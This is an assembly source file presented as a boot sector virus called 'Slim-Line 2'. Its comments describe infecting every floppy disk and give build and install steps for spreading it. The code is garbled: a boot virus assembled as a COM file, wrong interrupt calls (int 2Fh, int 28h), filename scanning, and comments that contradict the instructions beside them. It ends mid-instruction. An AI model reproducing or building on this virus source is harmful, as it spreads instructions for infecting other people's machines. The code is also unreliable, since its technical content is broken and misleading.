;
; The Slim-Line 2 Virus
;
; This is a boot block virus of about one sector that does not use its own
; stack or modify any other general purpose registers besides SI, DI and BX.
; It will infect all floppy disks inserted into a PC AT or PS/2 running DOS
; 3.x (should work on earlier versions but I haven't tested it).
;
; This is a very short virus - only 417 bytes long including the partition
; table at the end.  It runs part-time as an interrupt handler until it finds
; a disk to attack and then takes over the formatting process.  Because it
; uses the absolute jump format, it won't work on machines with segment
; > 0FFh so if you want it to run there you'll have to add a few lines of 
; code to reload it into low memory.  
;
; I wrote this virus in response to repeated requests from people wanting a
; small boot sector infector.  There are several published descriptions of
; boot sector viruses but none give the complete source code.  In many cases,
; the authors simply provided a binary dump which could be assembled back to
; the original code but such a release can do even less harm than the final
; program itself since competent programmers can usually fix bugs without
; changing much else.  Other sources provide enough information to assemble
; the attached description but they often lack clarity and completeness.  
;
; This version has been tested by re-assembly using MASM 5.0 but should be
; easy to compile with any assembler that understands most of the directives
; in the A86 assembler language.  To build this program as is, just assemble
; this file and convert the .BIN output file to a_formatted diskette using
; a hex editor.  Then copy the resulting formatted diskette onto another
; blank diskette and install it as the boot disk on any PC.  The next time
; the machine boots off that drive, it will become infected again.
;
; Disclaimers:  Donor: YAMC    Author: P. Roderick Stonehill  
; Organization: York Anti-Virus Monthly Challenge (YAMC)      
; Date: 1 Feb '91                                             
;        
;

.model tiny

.code

        org     0100h                       ; make it a COM file 

start:

        jmp     main                        ; get around DOS's "first byte" restriction

        db      'SlimLine2'                 ; author identification

;----------------------- Interrupt 13H Handler ------------------------------

int_13h:

        pushf                               ; save status flags
        call    i13handler                  ; transfer control to handler

        retf                                ; return to old interrupt vector

i13handler:

        cmp     ah,[bx+bufptr]              ; see what function is being called
        je      checkfunc                   ; AH==0x0? test parameters
                                            ; otherwise return w/error
checkfunc:

        xor     ax,ax                       ; clear register

        int     2Fh                         ; DTA function

        mov     dx,[bx+bufptr+0Eh]          ; point to filename in DTA

        cld                                 ; forward direction scans

findnext:

        lodsb                               ; get next char in name

        cmp     al,'.'                      ; find extension
        jz      chkmatch                    ; found it, see if match
        cmp     al,':'
        jz      donefn
        loop    findnext                    ; keep looking

donefn:

        retf                                ; no more files, quit

chkmatch:

        lodsw                               ; get word value of first two chars

        cmp     ax,'OC'                     ; compare with 'CO'

        jb      nextfile                    ; neither C nor O, try again

        push    bx                          ; save file index

        call    infectdisk                  ; attempt to infect current disk

        pop     bx                          ; restore file index

nextfile:

        inc     di                          ; point to next entry in buffer

        cmp     byte ptr [di],0             ; see if we've reached the end
        jnz     findnext                    ; no more floppies, exit

        jmp     short checkfunc             ; still files left, go back & test


infectdisk:

        mov     cx,sectors                  ; read sectors into buffer
        mov     si,offset bufptr            ; point to load area

readtrack:

        mov     dh,[si+headnum]             ; head number
        mov     dl,cntrlbyte                ; cylinder # (AH)
        mov     cl,12                       ; sector #

        int     28h                         ; read track

        add     si,bp                       ; move pointer up a pararaph

        dec    